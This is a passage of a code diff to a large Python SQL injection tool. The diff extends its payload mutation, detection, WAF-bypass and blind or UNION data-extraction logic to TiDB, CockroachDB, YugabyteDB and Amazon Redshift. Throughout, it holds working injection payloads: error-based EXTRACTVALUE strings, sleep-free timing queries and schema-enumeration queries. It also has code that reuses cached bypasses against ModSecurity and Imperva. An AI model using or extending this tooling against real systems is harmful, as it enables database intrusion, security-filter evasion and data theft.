+            # BUG-WHITESPACE-TIDB FIX: TiDB also treats /**/ as whitespace like MySQL.
             _junk = ''.join(rng.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=rng.randint(0, 3)))
             _choices.append(f"/*{_junk}*/")
         return rng.choice(_choices)
@@ -35028,8 +35177,9 @@ class PayloadMutationEngine:
             f"-- {''.join(rng.choices('abcdefghijklmnopqrstuvwxyz', k=rng.randint(1, 4)))}",
             "-- -",
         ]
-        # MySQL and MariaDB support # as comment
-        if dbms in ("MySQL", "MariaDB", "Generic"):
+        # MySQL, MariaDB, and TiDB support # as comment
+        if dbms in ("MySQL", "MariaDB", "TiDB", "Generic"):
+            # BUG-COMMENT-TIDB FIX: TiDB supports # as a line comment like MySQL.
             _styles.append("#")
         return rng.choice(_styles)
     
@@ -35072,15 +35222,16 @@ class PayloadMutationEngine:
         """
         try:
             val = int(num_str)
+            _pg_compat = ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift")  # BUG-MUTNUM-CRDB-YG-REDSHIFT FIX: PG-wire-compat engines use same numeric literal rules
             if val == 0:
-                if dbms in ("PostgreSQL", "Oracle"):
+                if dbms in ("Oracle",) + _pg_compat:
                     return rng.choice(["0", "(0)"])
                 elif dbms in ("MSSQL", "Sybase"):
                     # BUG-MUTNUM-ORACLE-MSSQL FIX: no 0x0 (binary) for MSSQL
                     return rng.choice(["0", "(0)", "0e0"])
                 return rng.choice(["0", "0x0", "(0)", "0e0", "FALSE"])
             if val == 1:
-                if dbms in ("PostgreSQL", "Oracle"):
+                if dbms in ("Oracle",) + _pg_compat:
                     return rng.choice(["1", "(1)"])
                 elif dbms in ("MSSQL", "Sybase"):
                     # BUG-MUTNUM-ORACLE-MSSQL FIX: no 0x1 (binary) for MSSQL; TRUE safe on 2022+ only
@@ -35090,7 +35241,9 @@ class PayloadMutationEngine:
                 # Keep as-is most of the time, occasionally use hex
                 # BUG-MUTNUM-ORACLE-MSSQL FIX: 0x hex integer literals are Oracle-invalid
                 # and binary-type (not int) on MSSQL — restrict to MySQL/SQLite/Generic only.
-                if dbms not in ("PostgreSQL", "Oracle", "MSSQL", "Sybase") and rng.random() < 0.25:
+                # BUG-MUTNUM-CRDB-YG-REDSHIFT FIX: CockroachDB/YugabyteDB/Redshift are PG-wire-compat;
+                # 0x hex literals are not valid in PostgreSQL-dialect SQL.
+                if dbms not in ("Oracle", "MSSQL", "Sybase") + _pg_compat and rng.random() < 0.25:
                     return f"0x{val:x}"
             return num_str
         except ValueError:
@@ -35109,9 +35262,11 @@ class PayloadMutationEngine:
                 f"AND {_n} IN({_n})",
                 f"AND NOT {_n}={_n+1}",
             ]
-            if dbms in ("MySQL", "MariaDB", "Generic"):
+            if dbms in ("MySQL", "MariaDB", "TiDB", "Generic"):
+                # BUG-RANDTRUE-LIKE-TIDB FIX: TiDB supports integer LIKE comparison like MySQL.
                 _variants.append(f"AND {_n} LIKE {_n}")
-            if dbms in ("PostgreSQL",):
+            if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                # BUG-RANDTRUE-CRDB FIX: wire-compat PG DBMSes support ::int cast syntax.
                 _variants.append(f"AND {_n}::int={_n}::int")
             return rng.choice(_variants)
         
@@ -35195,9 +35350,20 @@ class PayloadMutationEngine:
                        "UPPER":     ["UCASE"],          "LOWER": ["LCASE"]},
         "MariaDB":    {"SUBSTRING": ["SUBSTR","MID"],  "LENGTH": ["CHAR_LENGTH"],
                        "UPPER":     ["UCASE"],          "LOWER": ["LCASE"]},
+        # BUG-FNALIAS-TIDB FIX: TiDB is MySQL-compatible; same aliases as MySQL.
+        "TiDB":       {"SUBSTRING": ["SUBSTR","MID"],  "LENGTH": ["CHAR_LENGTH"],
+                       "UPPER":     ["UCASE"],          "LOWER": ["LCASE"]},
         # PostgreSQL
         "PostgreSQL": {"SUBSTRING": ["SUBSTR"],        "LENGTH": ["CHAR_LENGTH","CHARACTER_LENGTH"],
                        "UPPER":     ["UPPER"],          "LOWER": ["LOWER"]},
+        # BUG-FNALIAS-PGCOMPAT FIX: CockroachDB/YugabyteDB/Amazon Redshift use PG aliases.
+        # The MySQL-fallback would inject MID() / UCASE() which are not valid on these engines.
+        "CockroachDB":     {"SUBSTRING": ["SUBSTR"],   "LENGTH": ["CHAR_LENGTH","CHARACTER_LENGTH"],
+                            "UPPER":     ["UPPER"],     "LOWER": ["LOWER"]},
+        "YugabyteDB":      {"SUBSTRING": ["SUBSTR"],   "LENGTH": ["CHAR_LENGTH","CHARACTER_LENGTH"],
+                            "UPPER":     ["UPPER"],     "LOWER": ["LOWER"]},
+        "Amazon Redshift": {"SUBSTRING": ["SUBSTR"],   "LENGTH": ["CHAR_LENGTH","LEN"],
+                            "UPPER":     ["UPPER"],     "LOWER": ["LOWER"]},
         # Oracle
         # BUG-ORACLE-LENGTHB FIX: LENGTHB returns the BYTE count of the string
         # in the database character set (e.g. AL32UTF8), which differs from the
@@ -35346,8 +35512,10 @@ class PayloadMutationEngine:
             return payload
         _cast_type = {
             "MySQL": "SIGNED", "MariaDB": "SIGNED",
-            "PostgreSQL": "INTEGER", "MSSQL": "INT",
-            "Oracle": "NUMBER", "SQLite": "INTEGER",
+            "TiDB": "SIGNED",   # BUG-CAST-TYPE-TIDB FIX: TiDB uses SIGNED like MySQL
+            "PostgreSQL": "INTEGER", "CockroachDB": "INTEGER",
+            "YugabyteDB": "INTEGER", "Amazon Redshift": "INTEGER",
+            "MSSQL": "INT", "Oracle": "NUMBER", "SQLite": "INTEGER",
         }.get(dbms, "SIGNED")
         # Only wrap the first standalone non-functional integer
         def _wrap_num(m):
@@ -35384,7 +35552,8 @@ class PayloadMutationEngine:
         # DBMS heuristic returns "Generic" would silently corrupt the AND chain.
         if _EXTRACTION_ACTIVE[0]:
             return payload
-        if dbms not in ("MySQL", "MariaDB", "Generic"):
+        if dbms not in ("MySQL", "MariaDB", "TiDB", "Generic"):
+            # BUG-LOGICALALT-TIDB FIX: TiDB supports && and || as logical operators like MySQL.
             return payload
         if rng.random() >= 0.15:
             return payload
@@ -36838,6 +37007,13 @@ class DetectionResult:
 # times per scan. Now defined once here and referenced via module-level names.
 _GDBT_DBMS_MAP: dict = {
     'mysql':       'MYSQL',      'mariadb':        'MYSQL',
+    # BUG-GDBT-TIDB FIX: TiDB was absent from _GDBT_DBMS_MAP. get_dbms_payloads("TiDB", ...)
+    # called _GDBT_DBMS_MAP.get("tidb") → None → returned [] for ALL technique categories.
+    # This meant the detection cascade had zero payloads for TiDB targets — falling through
+    # with no detections even when a MySQL/TiDB-compatible injection exists.
+    # TiDB is MySQL-wire-compatible: all MySQL boolean/timing/error/union/stacked payload
+    # structures are valid TiDB SQL. Fix: map 'tidb' → 'MYSQL' so TiDB gets MySQL payloads.
+    'tidb':        'MYSQL',
     'postgresql':  'POSTGRESQL', 'postgres':       'POSTGRESQL',
     'pgsql':       'POSTGRESQL', 'pg':             'POSTGRESQL',
     'oracle':      'ORACLE',     'oracle database':'ORACLE',
@@ -36847,6 +37023,12 @@ _GDBT_DBMS_MAP: dict = {
     'cockroachdb': 'POSTGRESQL', 'cockroach':      'POSTGRESQL',
     'amazon redshift': 'POSTGRESQL', 'redshift':   'POSTGRESQL',
     'yugabyte':    'POSTGRESQL',
+    # BUG-GDBT-YUGABYTEDB FIX: 'yugabyte' was present but 'yugabytedb' was missing.
+    # get_dbms_payloads("YugabyteDB", ...) → _GDBT_DBMS_MAP.get("yugabytedb") → None → [].
+    # normalize_dbms("YugabyteDB") produces "YugabyteDB" (exact match), which lowercased
+    # gives "yugabytedb" — the lookup key. Without this entry, all payload lookups for
+    # YugabyteDB returned []. YugabyteDB is PostgreSQL-compatible; map to 'POSTGRESQL'.
+    'yugabytedb':  'POSTGRESQL',
 }
 
 # BUG-8-FIX (Req 3): Module-level per-DBMS timing threshold floor dicts.
@@ -36885,6 +37067,13 @@ _DBMS_TIMING_FLOORS: dict = {
     'SYBASE':       450.0,   # WAITFOR DELAY: same as MSSQL
     'ORACLE':       650.0,   # DBMS_PIPE/LOCK: cloud Oracle CDN jitter up to 480ms; +170ms headroom
     'SQLITE':       600.0,   # RANDOMBLOB: heavy-alloc imprecise timing; conservative floor
+    # BUG-TIMING-FLOOR-TIDB FIX: TiDB uses SLEEP() like MySQL — explicit entry prevents
+    # 'TIDB'.upper() → '' fallback path; 200ms is correct (MySQL-equivalent jitter floor).
+    'TIDB':         200.0,   # SLEEP(): MySQL-wire-compatible; same floor as MySQL
+    # BUG-TIMING-FLOOR-YUGABYTEDB FIX: YugabyteDB uses pg_sleep() — explicit entry.
+    'YUGABYTEDB':   200.0,   # pg_sleep(): PostgreSQL-compatible; same floor as PostgreSQL
+    # BUG-TIMING-FLOOR-AMAZONREDSHIFT FIX: Redshift uses pg_sleep() — explicit entry.
+    'AMAZON REDSHIFT': 200.0,  # pg_sleep(): PostgreSQL-compatible; cloud Redshift jitter ~120ms
     # FIX-TIMING-FLOOR-EMPTY (Issue 3): When DBMS not yet fingerprinted, the key is ''.
     # Without this entry, PCV Check B uses 150ms fallback which is too low for any CDN target.
     # Use a conservative PostgreSQL-level floor (200ms) as the safe unknown-DBMS default.
@@ -36948,6 +37137,7 @@ _GDBT_UPPERCASE_TO_TITLECASE: dict = {
 }
 _GDBT_CPDB_DBMS_KEY_MAP: dict = {
     'mysql':         'MySQL',      'mariadb':      'MariaDB',
+    'tidb':          'MySQL',      # BUG-CPDBMAP-TIDB FIX: TiDB → MySQL (MySQL-wire-compatible)
     'postgresql':    'PostgreSQL', 'postgres':     'PostgreSQL',
     'pgsql':         'PostgreSQL', 'pg':           'PostgreSQL',
     'oracle':        'Oracle',     'oracle database': 'Oracle',
@@ -36957,6 +37147,11 @@ _GDBT_CPDB_DBMS_KEY_MAP: dict = {
     'cockroachdb':   'PostgreSQL', 'cockroach':    'PostgreSQL',
     'redshift':      'PostgreSQL', 'amazon redshift': 'PostgreSQL',
     'yugabyte':      'PostgreSQL',
+    # BUG-CPDBMAP-YUGABYTEDB FIX: 'yugabytedb' was missing — only 'yugabyte' existed.
+    # get_dbms_payloads("YugabyteDB",...) lowercases to "yugabytedb" for lookup.
+    # Without this entry _filter_dbms_key = 'YugabyteDB' (fallback) → _filter_is_pg=False
+    # → PostgreSQL COPY-TO filter not applied to YugabyteDB payload lists.
+    'yugabytedb':    'PostgreSQL',
 }
 
 
@@ -40658,8 +40853,22 @@ async def detect_error(engine,config,method,url,data,data_fmt,
                             _dna_e_body = _safe_decode_body(_dna_e_fp, encoding="utf-8", errors="replace", func_name="detect_error.dna_shuffle").lower()
                             _dna_e_bl_body = _baseline_body if isinstance(_baseline_body, str) else ''
                             _dna_e_pats = SQL_ERROR_PATTERNS.get(_dna_e_dbms, [])
-                            if any(p.lower() in _dna_e_body for p in _dna_e_pats
-                                   if p.lower() not in _dna_e_bl_body):
+                            # BUG-P FIX (HIGH; detect_error DNA shuffle path; all DBMSes):
+                            # SQL_ERROR_PATTERNS values are regex strings (e.g.
+                            # r"extract_?value\s*\(", r"(\~|0x7e)[0-9a-f]{4,}",
+                            # r"pg_query|pg_exec", r"column count doesn.t match" etc.).
+                            # The previous code used Python's `in` operator (substring
+                            # match) on already-lowercased body strings, so any pattern
+                            # containing regex metacharacters (\s*, \(, (?:...), [0-9a-f],
+                            # |, ., etc.) would never match a literal body substring — DNA
+                            # shuffle error detection was effectively dead for every DBMS
+                            # whose SQL_ERROR_PATTERNS contain metacharacters (MySQL,
+                            # MariaDB, TiDB, PostgreSQL, MSSQL, Oracle, etc.).
+                            # Fix: use re.search(p, body, re.I) for both the match check
+                            # and the baseline exclusion check, matching the behaviour of
+                            # the primary error detection loop at L40604-40709.
+                            if any(re.search(p, _dna_e_body, re.I) for p in _dna_e_pats
+                                   if not re.search(p, _dna_e_bl_body, re.I)):
                                 _dna_e_det = DetectionResult(param=param, technique='E',
                                     payload=_dna_e_pay, dbms=_dna_e_dbms, confidence=0.73,
                                     notes=f'dna_shuffle_error:{_dna_e_lbl}')
@@ -41478,10 +41687,35 @@ _SLEEP_FREE_TIMING = {
         "BENCHMARK({big},MD5(1))",
         "(SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B)",
     ],
+    # BUG-SLEEPFREE-TIDB FIX: TiDB is MySQL-wire-compatible; BENCHMARK() and information_schema
+    # cross-joins are valid TiDB heavy-computation timing techniques (identical to MySQL).
+    "TiDB": [
+        "BENCHMARK({big},SHA1(RAND()))",
+        "BENCHMARK({big},MD5(1))",
+        "(SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C)",
+        "(SELECT COUNT(*) FROM information_schema.tables A,information_schema.tables B)",
+    ],
     "PostgreSQL": [
         "(WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n<{big}) SELECT COUNT(*) FROM t)::void",
         "(SELECT COUNT(*) FROM pg_stat_activity A,pg_stat_activity B,pg_stat_activity C)::void",
         "(SELECT COUNT(*) FROM pg_class A,pg_class B,pg_class C)::void",
+    ],
+    # BUG-SLEEPFREE-CRDB FIX: CockroachDB is PG-wire-compatible; pg_class cross-joins
+    # and generate_series are valid CockroachDB heavy-computation timing techniques.
+    "CockroachDB": [
+        "(SELECT COUNT(*) FROM pg_class A,pg_class B,pg_class C)",
+        "(SELECT COUNT(*) FROM generate_series(1,{big}) a, generate_series(1,10) b)",
+    ],
+    # BUG-SLEEPFREE-YUGABYTE FIX: YugabyteDB is PG-wire-compatible; same techniques as CockroachDB.
+    "YugabyteDB": [
+        "(SELECT COUNT(*) FROM pg_class A,pg_class B,pg_class C)",
+        "(SELECT COUNT(*) FROM generate_series(1,{big}) a, generate_series(1,10) b)",
+    ],
+    # BUG-SLEEPFREE-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible; generate_series and
+    # pg_class cross-joins are valid heavy-computation timing techniques for Redshift.
+    "Amazon Redshift": [
+        "(SELECT COUNT(*) FROM generate_series(1,{big}) a, generate_series(1,10) b)",
+        "(SELECT COUNT(*) FROM pg_class A,pg_class B)",
     ],
     "MSSQL": [
         "(SELECT COUNT(*) FROM sysobjects A,sysobjects B,sysobjects C)",
@@ -41571,7 +41805,8 @@ async def _detect_time_sleep_free(
     ]
 
     dbms_order: List[str] = ([confirmed_dbms] if confirmed_dbms else []) + [
-        "MySQL", "PostgreSQL", "MSSQL", "SQLite", "Oracle", "MariaDB"]
+        "MySQL", "PostgreSQL", "MSSQL", "SQLite", "Oracle", "MariaDB",
+        "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift"]  # BUG-SLEEPFREE-NEWDBMS FIX: wire-compat engines must be probed so _SLEEP_FREE_TIMING entries for them are exercised
     seen: set = set()
 
     for dbms in dbms_order:
@@ -42658,7 +42893,19 @@ async def detect_time(engine, config, method, url, data, data_fmt,
                             timeout=_dna_t_sleep * 3 + 10)
                         _dna_t_elapsed = (time.monotonic() - _dna_t0) * 1000
                         # Require at least 70% of requested sleep plus canary check
-                        _dna_t_threshold = (baseline.get('mean_timing', 200)
+                        # BUG-Q FIX (HIGH; detect_time DNA shuffle path; all DBMSes):
+                        # `baseline.get('mean_timing', 200)` used the raw uncalibrated value
+                        # from the baseline dict (default 200ms) instead of `mean_t` which
+                        # was updated by RobustTimingOracle.calibrate() and
+                        # TimingPrecisionBooster earlier in detect_time. On slow CDN targets
+                        # where calibration raised mean_t to 1500ms+, the DNA threshold was
+                        # computed using 200ms → threshold too low → CDN jitter alone triggers
+                        # false positives in the DNA timing path. Also: if baseline is not a
+                        # dict (e.g. None), baseline.get(...) raises AttributeError, which is
+                        # silently caught by the outer except block, aborting the entire DNA
+                        # timing path. Using mean_t (always a float, computed earlier) avoids
+                        # both the miscalibration and the potential AttributeError.
+                        _dna_t_threshold = (mean_t
                                              + _dna_t_sleep * 1000 * 0.65)
                         if _dna_t_elapsed >= _dna_t_threshold:
                             # Quick canary: verify clean request is NOT slow
@@ -42667,7 +42914,7 @@ async def detect_time(engine, config, method, url, data, data_fmt,
                             _dna_t_canary = await _send_injected(engine, method, url, data,
                                                                    data_fmt, param, original,
                                                                    tamper_chain)
-                            _dna_canary_thresh = baseline.get('mean_timing', 200) * 1.5
+                            _dna_canary_thresh = mean_t * 1.5
                             if _dna_t_canary and _dna_t_canary.elapsed_ms < _dna_canary_thresh:
                                 _dna_t_det = DetectionResult(param=param, technique='T',
                                     payload=_dna_t_pay, dbms=_dna_t_dbms, confidence=0.74,
@@ -43587,7 +43834,11 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
         # PostgreSQL error: PostgreSQL doesn't support 0x hex literals (use E'\x').
         # Fix: apply the same regex substitution (0x[hex] → decimal) to _original_clean
         # when the detected DBMS is PostgreSQL or Oracle, consistent with BUG-V213-C.
-        if _detected_dbms.upper() in ('POSTGRESQL', 'ORACLE'):
+        # BUG-HEX-STRIP-PGCOMPAT FIX: CockroachDB/YugabyteDB/Amazon Redshift are
+        # PostgreSQL-wire-compatible and also reject 0x hex integer literals. Apply the
+        # same stripping that PostgreSQL/Oracle use.
+        if _detected_dbms.upper() in ('POSTGRESQL', 'ORACLE', 'COCKROACHDB',
+                                       'YUGABYTEDB', 'AMAZON REDSHIFT'):
             def _hex_to_dec_oc(m):
                 try: return str(int(m.group(0), 16))
                 except ValueError: return m.group(0)
@@ -43660,7 +43911,7 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                     _ei_calib_dbms = _ifunc_dbms_ei
                     _ei_numeric = (getattr(result, 'technique', '') in
                                    ("B", "BH", "IN", "T", "TH", "HQ", "BT"))
-                    if _ei_calib_dbms == "PostgreSQL":
+                    if _ei_calib_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-EI-CALIB-PG-COMPAT FIX
                         _ei_comment = "-- -"
                         _ei_true_pay  = (f" AND ({_ei_true_cond})=1{_ei_comment}" if _ei_numeric
                                          else f"' AND ({_ei_true_cond})=1{_ei_comment}")
@@ -43871,7 +44122,7 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                                  else 'MySQL')
                     _fb_num3 = (result.technique in ("B", "BH", "IN", "T", "TH", "HQ", "BT")
                                 if result and hasattr(result, 'technique') else True)
-                    if _fb_dbms3 == "PostgreSQL":
+                    if _fb_dbms3 in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-FBDBMS3-PG-COMPAT FIX
                         payload = (f" AND ({expr})=1-- -" if _fb_num3 else f"' AND ({expr})=1-- -")
                     elif _fb_dbms3 == "Oracle":
                         # BUG-ORACLE-DUAL-INJECTION FIX (Req 7/8/10): The old payload
@@ -45839,7 +46090,7 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
                     # without a leading quote in most SQL engines when the parameter is unquoted.
                     _fb_dbms = _detected_dbms
                     _fb_numeric = (result.technique in ("B", "BH", "IN", "T", "TH", "HQ", "BT"))
-                    if _fb_dbms == "PostgreSQL":
+                    if _fb_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-FBDBMS-PG-COMPAT FIX
                         payload = (f" AND ({expr})=1-- -" if _fb_numeric
                                    else f"' AND ({expr})=1-- -")
                     elif _fb_dbms == "Oracle":
@@ -46154,7 +46405,7 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
                     # BUG-R10-FALLBACK FIX (Req 10): DBMS-aware fallback (same fix as pivot section)
                     _fb_dbms2 = _detected_dbms
                     _fb_numeric2 = (result.technique in ("B", "BH", "IN", "T", "TH", "HQ", "BT"))
-                    if _fb_dbms2 == "PostgreSQL":
+                    if _fb_dbms2 in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-FBDBMS2-PG-COMPAT FIX
                         payload = (f" AND ({expr})=1-- -" if _fb_numeric2
                                    else f"' AND ({expr})=1-- -")
                     elif _fb_dbms2 == "Oracle":
@@ -47333,6 +47584,82 @@ SCHEMA_ENUM_FALLBACKS: Dict[str, Dict[str, List[str]]] = {
             " FROM pragma_table_info('{table}')",
         ],
     },
+    # BUG-SCHENUM-TIDB FIX: TiDB is MySQL-wire-compatible; use MySQL-style fallbacks.
+    "TiDB": {
+        "dbs": [
+            "SELECT GROUP_CONCAT(SCHEMA_NAME ORDER BY SCHEMA_NAME SEPARATOR ',')"
+            " FROM information_schema.SCHEMATA",
+            "SELECT EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(schema_name"
+            " SEPARATOR ',') FROM information_schema.schemata)))",
+        ],
+        "tables": [
+            "SELECT GROUP_CONCAT(TABLE_NAME ORDER BY TABLE_NAME SEPARATOR ',')"
+            " FROM information_schema.TABLES WHERE TABLE_SCHEMA='{db}'",
+            "SHOW TABLES FROM `{db}`",
+        ],
+        "columns": [
+            "SELECT GROUP_CONCAT(COLUMN_NAME ORDER BY ORDINAL_POSITION SEPARATOR ',')"
+            " FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{table}'",
+            "SHOW COLUMNS FROM `{db}`.`{table}`",
+        ],
+    },
+    # BUG-SCHENUM-CRDB FIX: CockroachDB is PostgreSQL-wire-compatible; use PG-style fallbacks.
+    "CockroachDB": {
+        "dbs": [
+            "SELECT string_agg(schema_name, ',' ORDER BY schema_name)"
+            " FROM information_schema.schemata WHERE catalog_name=current_database()",
+            "SELECT string_agg(nspname, ',' ORDER BY nspname)"
+            " FROM pg_catalog.pg_namespace WHERE nspname NOT LIKE 'pg_%'"
+            " AND nspname != 'information_schema' AND nspname != 'crdb_internal'",
+        ],
+        "tables": [
+            "SELECT string_agg(table_name, ',' ORDER BY table_name)"
+            " FROM information_schema.tables WHERE table_schema='{db}' AND table_type='BASE TABLE'",
+        ],
+        "columns": [
+            "SELECT string_agg(column_name, ',' ORDER BY ordinal_position)"
+            " FROM information_schema.columns"
+            " WHERE table_schema='{db}' AND table_name='{table}'",
+        ],
+    },
+    # BUG-SCHENUM-YUGABYTE FIX: YugabyteDB is PostgreSQL-wire-compatible; use PG-style fallbacks.
+    "YugabyteDB": {
+        "dbs": [
+            "SELECT string_agg(nspname, ',' ORDER BY nspname)"
+            " FROM pg_catalog.pg_namespace WHERE nspname NOT LIKE 'pg_%'"
+            " AND nspname != 'information_schema'",
+            "SELECT string_agg(schema_name, ',' ORDER BY schema_name)"
+            " FROM information_schema.schemata WHERE catalog_name=current_database()",
+        ],
+        "tables": [
+            "SELECT string_agg(table_name, ',' ORDER BY table_name)"
+            " FROM information_schema.tables WHERE table_schema='{db}' AND table_type='BASE TABLE'",
+        ],
+        "columns": [
+            "SELECT string_agg(column_name, ',' ORDER BY ordinal_position)"
+            " FROM information_schema.columns"
+            " WHERE table_schema='{db}' AND table_name='{table}'",
+        ],
+    },
+    # BUG-SCHENUM-REDSHIFT FIX: Amazon Redshift is PG-compatible but has a restricted catalog.
+    # Use information_schema which Redshift supports fully; avoid pg_catalog internal tables.
+    "Amazon Redshift": {
+        "dbs": [
+            "SELECT LISTAGG(DISTINCT schema_name, ',') WITHIN GROUP (ORDER BY schema_name)"
+            " FROM information_schema.schemata WHERE catalog_name=current_database()",
+            "SELECT schema_name FROM information_schema.schemata"
+            " WHERE catalog_name=current_database() LIMIT 1",
+        ],
+        "tables": [
+            "SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name)"
+            " FROM information_schema.tables WHERE table_schema='{db}' AND table_type='BASE TABLE'",
+        ],
+        "columns": [
+            "SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY ordinal_position)"
+            " FROM information_schema.columns"
+            " WHERE table_schema='{db}' AND table_name='{table}'",
+        ],
+    },
 }
 
 # v17: Query edge-case normalization helpers
@@ -47705,6 +48032,9 @@ def _build_dbms_char_func_default(dbms: str) -> str:
         "PostgreSQL":  "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
         "CockroachDB": "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
         "YugabyteDB":  "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
+        # BUG-CHARFN-REDSHIFT FIX: Amazon Redshift is PG-compatible; explicit entry
+        # avoids falling to generic default. Redshift SUBSTRING and ASCII work correctly.
+        "Amazon Redshift": "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
         "DuckDB":      "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
         "MSSQL":       "ISNULL(UNICODE(SUBSTRING(({query}),{pos},1)),0)",
         "Sybase":      "ISNULL(UNICODE(SUBSTRING(({query}),{pos},1)),0)",
@@ -48021,7 +48351,12 @@ class Enumerator:
                             _inject_col = _ci
                             break
                     # Build UNION SELECT with sql expression in the injection column
-                    _sep = '||' if self.dbms in ('PostgreSQL', 'Oracle', 'SQLite') else (
+                    # BUG-UNION-SEP-PGCOMPAT FIX: CockroachDB/YugabyteDB/Amazon Redshift are
+                    # PG-wire-compatible; they use || for string concatenation like PostgreSQL.
+                    # Without explicit entries they fell to 'CONCAT(' (MySQL-style), which
+                    # works but produces sub-optimal SQL that may confuse UNION column parsing.
+                    _sep = '||' if self.dbms in ('PostgreSQL', 'Oracle', 'SQLite',
+                                                  'CockroachDB', 'YugabyteDB', 'Amazon Redshift') else (
                            '+' if self.dbms == 'MSSQL' else 'CONCAT(')
                     # BUG-ORACLE-CAST-TEXT FIX (Req 7/8): CAST(x AS TEXT) is PostgreSQL-only;
                     # BUG-R10-A FIX: Oracle TO_CHAR wrapping a subquery MUST use
@@ -48067,7 +48402,13 @@ class Enumerator:
                             _sql_col = f'TO_CHAR({_ora_sql_limited})'
                         else:
                             _sql_col = f'TO_CHAR(({sql}))'  # BUG-R10-A FIX: double parens; simple expr
-                    elif self.dbms in ('PostgreSQL', 'SQLite'):
+                    # BUG-UNION-CAST-PGCOMPAT FIX: CockroachDB/YugabyteDB/Amazon Redshift are
+                    # PG-wire-compatible and support CAST(... AS TEXT). Without explicit entries
+                    # they fell to the else branch `f'({sql})'` — no type cast — which causes
+                    # UNION column type mismatch errors when the injected expression returns TEXT
+                    # but the detection UNION column is typed as another type (INT, BOOL, etc.).
+                    elif self.dbms in ('PostgreSQL', 'SQLite',
+                                       'CockroachDB', 'YugabyteDB', 'Amazon Redshift'):
                         _sql_col = f'CAST(({sql}) AS TEXT)'
                     elif self.dbms == 'MSSQL':
                         # BUG-7-A FIX (Issue 7): MSSQL raises "Subquery returned more than
@@ -49282,9 +49623,34 @@ class Enumerator:
                         # Without this, timing injection always reaches "No oracle available"
                         # on WAF-protected targets because TBExtract's EBF runs only INSIDE
                         # blind_extract_string — which is never called before _extract_str.
+                        #
+                        # BUG-R1-FIX (CRITICAL): When EBF bypass was loaded from cache and
+                        # both standard (ISNULL) and nofunc (1<2) oracle validation fail,
+                        # the validation conditions themselves are WAF-blocked, NOT the bypass.
+                        # The cached EBF entry was already live-validated by ExtractionBypassFinder
+                        # when it was first found and stored.  Running a second prewarm EBF on a
+                        # cached-bypass target is wasteful: EBF.find() probes the same target with
+                        # the same templates and always finds the same (already cached) bypass.
+                        # Root cause: _build_timing_payload_tf applies obfuscate_cond(cond, tag)
+                        # to oracle validation conditions (ISNULL/ISNULL).  With tag='30000' this
+                        # produces ISN/*!30000*/ULL(NULL) which ModSecurity/Imperva block regardless
+                        # of version-comment splitting.  Both probes return fast → validation fails
+                        # → second EBF prewarm → same bypass found → second redundant cache write.
+                        # Fix: set _r1_trusted=True when bypass came from cache; skip prewarm and
+                        # prevent the final "if not _ebf_prewarm_ok" from disarming _eval_fn.
+                        _r1_trusted = False
+                        if _ebf_tf_from_cache:
+                            _tf_ebf_mode[0] = True
+                            _eval_fn = _timing_eval_fn_tf
+                            _oracle_name = "timing_fallback_ebf_cached"
+                            _r1_trusted = True
+                            print("[+] [Extract] Timing fallback oracle: trusting cached EBF "
+                                  "bypass (standard+nofunc validation conditions WAF-blocked; "
+                                  "cached bypass was previously validated by ExtractionBypassFinder)",
+                                  flush=True)
                         _ebf_prewarm_ok = False
                         try:
-                            if _det_param_tf:
+                            if not _r1_trusted and _det_param_tf:
                                 print("[*] [Extract] Timing fallback oracle blocked — running "
                                       "ExtractionBypassFinder to find WAF bypass for extraction...",
                                       flush=True)
@@ -49440,7 +49806,7 @@ class Enumerator:
                                                   flush=True)
                         except Exception as _ebf_pw_err:
                             LOG.warning("[_extract_str] EBF pre-warm failed: %s", _ebf_pw_err)
-                        if not _ebf_prewarm_ok:
+                        if not _ebf_prewarm_ok and not _r1_trusted:
                             _eval_fn = None  # disarm so "No oracle available" fires below
                             _oracle_name = "timing_fallback_invalid"
 
@@ -49501,8 +49867,10 @@ class Enumerator:
         if _nofunc_len_skip:
             # Sentinel — binary search below checks for None and skips.
             _len_q = None
-        elif self.dbms == "PostgreSQL":
-            _len_q = f"CHAR_LENGTH(({sql}))"
+        elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            # BUG-EXTRACT-LENQ-PG-CRDB FIX: CockroachDB/YugabyteDB/Redshift are PG-wire-
+            # compatible; COALESCE(CHAR_LENGTH()) is supported and guards NULL subqueries.
+            _len_q = f"COALESCE(CHAR_LENGTH(({sql})),0)"
         elif self.dbms == "MSSQL":
             # BUG-ENUM-MSSQL-LEN FIX: The previous comment wrongly claimed that
             # LEN(CONVERT(NVARCHAR(MAX),x)) "includes trailing spaces (unlike bare LEN())".
@@ -49778,6 +50146,11 @@ class Enumerator:
                         # Fix: add explicit entries matching BatchedCharExtractor.CHAR_FUNCS.
                         "Sybase":     ("UNICODE", "SUBSTRING"),
                         "TiDB":       ("ORD",     "SUBSTRING"),
